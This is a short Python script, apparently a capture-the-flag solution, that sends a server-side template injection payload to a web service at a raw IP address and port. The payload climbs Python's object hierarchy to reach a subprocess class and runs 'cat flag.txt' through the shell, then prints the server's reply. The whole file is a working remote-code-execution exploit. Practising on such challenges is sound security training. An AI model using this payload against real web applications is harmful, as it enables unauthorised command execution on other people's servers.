import requests

domain_url = "http://157.245.40.149:32470/"

session = requests.Session()

# Potential SSTI
appended_url = "{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True, stdout=-1).communicate()}}"

url = domain_url + appended_url

req = session.get(url)
print(req.text)